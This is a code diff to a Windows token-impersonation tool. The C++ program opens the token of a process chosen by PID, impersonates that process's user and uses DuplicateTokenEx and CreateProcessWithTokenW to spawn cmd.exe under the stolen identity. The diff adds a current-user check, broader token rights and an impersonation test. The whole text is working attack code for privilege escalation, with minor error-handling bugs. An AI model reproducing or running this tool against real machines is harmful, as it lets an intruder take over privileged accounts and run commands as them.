@@ -1,6 +1,7 @@
 #include "pch.h"
 #include <windows.h>
 #include <iostream>
+#include <Lmcons.h>
 
 BOOL SetPrivilege(
 	HANDLE hToken,          // access token handle
@@ -51,7 +52,20 @@ BOOL SetPrivilege(
 	return TRUE;
 }
 
+std::string get_username()
+{
+	TCHAR username[UNLEN + 1];
+	DWORD username_len = UNLEN + 1;
+	GetUserName(username, &username_len);
+	std::wstring username_w(username);
+	std::string username_s(username_w.begin(), username_w.end());
+	return username_s;
+}
+
 int main(int argc, char** argv) {
+	// Print whoami to compare to thread later
+	printf("[+] Current user is: %s\n", (get_username()).c_str());
+	
 	// Grab PID from command line argument
 	char *pid_c = argv[1];
 	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
@@ -84,7 +98,7 @@ int main(int argc, char** argv) {
 	}
 	
 	// Call OpenProcessToken(), print return code and error code
-	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE, &tokenHandle);
+	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &tokenHandle);
 	if (GetLastError() == NULL)
 		printf("[+] OpenProcessToken() success!\n");
 	else
@@ -92,6 +106,21 @@ int main(int argc, char** argv) {
 		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
 		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
 	}
+
+	// Impersonate user in a thread
+	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
+	if (GetLastError() == NULL)
+	{
+		printf("[+] ImpersonatedLoggedOnUser() success!\n");
+		printf("[+] Current user is: %s\n", (get_username()).c_str());
+		printf("[+] Reverting thread to original user context\n");
+		RevertToSelf();
+	}
+	else
+	{
+		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
+		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
+	}	
 
 	// Call DuplicateTokenEx(), print return code and error code
 	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
@@ -102,7 +131,7 @@ int main(int argc, char** argv) {
 		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
 		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
 	}
-	
+
 	// Call CreateProcessWithTokenW(), print return code and error code
 	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
 	if (GetLastError() == NULL)
